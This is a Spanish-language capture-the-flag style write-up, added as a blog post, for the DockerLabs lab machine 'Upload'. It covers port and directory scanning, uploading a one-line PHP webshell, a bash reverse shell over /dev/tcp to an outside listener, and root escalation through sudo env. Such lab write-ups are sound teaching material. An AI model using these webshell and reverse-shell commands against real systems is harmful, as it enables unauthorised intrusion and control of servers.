@@ -1,0 +1,88 @@
+---
+layout: post
+title: "Upload"
+date: 2024-06-29 12:20:23
+category: sample
+vm: dockerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Upload </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/dockerlabs/upload/host.png){:.margin}
+
+**1\.** Descubrimos puertos y servicios de la maquina.
+
+`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/upload/nmap.png){:.margin}
+
+**2\.** En la web tenemos una subida de archivos.
+
+`http://172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/upload/80.png){:.margin}
+
+**3\.** Hago fuzzing de directorios y ficheros en la web.
+
+`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directoy-list-2.3-medium.txt -x html,php,txt -q`
+
+![img](/notas/public/img/dockerlabs/upload/gobuster.png){:.margin}
+
+**4\.** En el php tenemos la misma subida de archivos, y en uploads supongo que se almacena todo lo subido.
+
+`http://172.17.0.2/upload.php`
+
+`http://172.17.0.2/uploads/`
+
+![img](/notas/public/img/dockerlabs/upload/uploadphp.png){:.margin}
+![img](/notas/public/img/dockerlabs/upload/upload.png){:.margin}
+
+**5\.** Creo un php para subirlo y obtener una webshell, nuestro php lo encontramos en uploads.
+
+`echo '<?php system($_GET["cmd"]);?>' > shell.php`
+
+![img](/notas/public/img/dockerlabs/upload/shellphp.png){:.margin}
+![img](/notas/public/img/dockerlabs/upload/shellupload.png){:.margin}
+![img](/notas/public/img/dockerlabs/upload/uploads.png){:.margin}
+
+**6\.** Me pongo en escucha con nc para recibir la reverse shell.
+
+`nc -nlvp 4000`
+
+`http://172.17.0.2/uploads/shell.php?cmd= bash -c "bash -i >%26 /dev/tcp/192.168.18.8/4000 0>%261"`
+
+![img](/notas/public/img/dockerlabs/upload/80reverse.png){:.margin}
+![img](/notas/public/img/dockerlabs/upload/ncok.png){:.margin}
+
+**7\.** Revisando los permisos sudo, tengo este binario que puedo ejecutarlo como root.
+
+`sudo -l`
+
+![img](/notas/public/img/dockerlabs/upload/sudol.png){:.margin}
+
+**8\.** Escalando privilegios a root, busco en [gtfobins](https://gtfobins.github.io/gtfobins/env/#sudo) sobre el binario.
+
+`sudo env /bin/sh`
+
+![img](/notas/public/img/dockerlabs/upload/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
